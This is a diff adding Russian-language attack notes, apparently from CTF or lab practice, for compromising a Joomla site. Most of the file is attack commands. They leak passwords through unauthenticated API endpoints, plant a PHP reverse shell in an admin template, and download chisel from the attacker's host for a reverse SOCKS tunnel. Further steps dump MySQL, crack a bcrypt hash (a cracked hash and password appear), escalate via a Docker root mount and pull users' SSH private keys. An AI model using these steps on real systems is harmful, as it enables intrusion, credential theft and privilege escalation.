@@ -1,0 +1,40 @@
+Одна из самых популярных уяз в Joomla
+curl что-то/api/index.php/v1/config/application\?public=true   - ищем пароли пользюков
+curl что-то/api/index.php/v1/users?public=true   - ищем имена пользюков
+http://что-то/administrator/index.php - идем в админку
+Изменяем шаблон и делаем пхп реверс шелл (там разные, но когда-то была cassiopea)
+
+Ищем пароли от базы джумлы
+JOOMLA_DB_PASSWORD
+
+curl мы/chisel -O chisel
+./chisel server -p 8888 -reverse
+У нас делаем 
+chisel client 10.242.101.3:8888 R:socks > /dev/null 2>&1 &
+nano /etc/proxychains4.conf
+Прописываем
+
+cat /etc/hosts и так узнаем подсеть докера (сто проц она в докере)
+proxychains -q nmap -p 3306 172.16.1.1-5 (подсеть докера)
+Таким образом мы найдем адрес и порт с mysql (собственно, от нее и пароли)
+
+proxychains -q mysql -h 172.16.1.4 -u root -pПароль (адрес скули)
+show databases;
+use таблица
+show tables
+select * from че_хотим
+
+Если нашли пользователя - брутим
+hashcat -m 3200 -a 0 hash ~/wordlist/rockyou.txt -d 1 --show $2b$12$W8qjJaowcVi5R8byU6HoEuoy./.jj/uXKwDKAn1fSW6.vVecLI1Z6:chunkymonkey
+
+Иногда еще докером можно привелегии поднять. Упорото
+docker run -v /:/mnt --rm -it joomla:4.0.6-php8.0 chroot /mnt sh
+
+Если находим любые новые системы - ищем их уязы. Можно так:
+searchsploit Attendance and Payroll System
+
+Если видим что есть функциональность загрузки картинок и они меняются - возможно это ImageMagick, она уязвима
+Если хотим что-то вынуть - пробуем сначала получить /etc/passwd чтобы узнать пользователей
+Потом ищем /home/пользюк/.ssh/id_rsa
+
+Еще ищем всякие database.kdbx
